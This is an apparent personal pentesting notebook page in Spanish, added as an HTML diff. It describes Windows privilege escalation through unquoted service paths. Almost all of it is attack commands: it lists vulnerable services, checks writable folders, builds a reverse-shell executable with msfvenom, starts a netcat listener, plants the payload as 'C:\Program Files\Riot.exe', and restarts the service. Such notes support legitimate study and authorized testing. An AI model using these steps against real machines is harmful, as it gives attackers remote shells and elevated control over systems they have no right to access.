@@ -1,0 +1,112 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Permisos en Unquoted Paths | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="permisos-en-unquoted-paths">
+          <div class="note-tabbar">
+            <span>Permisos en Unquoted Paths</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Servicios y procesos</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / servicios y procesos</p>
+            <h2>Permisos en Unquoted Paths</h2>
+
+            <aside class="callout">
+              <p><strong>Ejecutar función auxiliar: <span>Función Auxiliar</span></strong> </p>
+            </aside>
+
+            <section class="code-card">
+              <h3>1. Listar Servicios Vulnerables: unquotedsvc</h3>
+              <pre><code># PowerShell
+$vuln = Get-WmiObject -Class win32_service | Where-Object {$_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith(&quot;`&quot;&quot;)) -and (-not $_.pathname.StartsWith(&quot;'&quot;)) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'}
+$vuln
+
+# CMD
+wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>2. Ver Path del Binario del servicio unquotedsvc</h3>
+              <pre><code># PowerShell
+Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq &quot;unquotedsvc&quot;} | Select-Object *
+# C:\Program Files\Riot Games\unquotedsvc.exe</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>3. Rutas del Binario con permisos de escritura</h3>
+              <pre><code># PowerShell
+ForEach ($serv in $vuln) {$SplitPathArray = $serv.pathname.Split(' ');$ConcatPathArray = @();for ($i=0;$i -lt $SplitPathArray.Count; $i++) {$ConcatPathArray += $SplitPathArray[0..$i] -join ' '};ModifiablePath $ConcatPathArray}
+# Ruta Vulnerable: C:\Program Files\Riot.exe
+
+# CMD: Manualmente cada ruta
+icacls &lt;path&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>4. Kali: Payload y Listener</h3>
+              <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=443 -f exe &gt; rev.exe
+rlwrap nc 443</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>5. Escribir la rev.exe la ruta relativa previa</h3>
+              <pre><code># PowerShell
+copy rev.exe &quot;C:\Program Files\Riot.exe&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>6. Reiniciar el servicio. Se debe producir un fallo al reiniciar</h3>
+              <pre><code># PowerShell
+cmd /c sc stop unquotedsvc
+cmd /c sc start unquotedsvc
+# CMD / PowerShell
+sc.exe stop unquotedsvc
+net stop unquotedsvc # Alternativa
+sc.exe start unquotedsvc
+net start unquotedsvc # Alternativa</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>servicios</span>
+              <span>procesos</span>
+              <span>permisos</span>
+              <span>unquoted</span>
+              <span>paths</span>
+              <span>unquoted_path</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
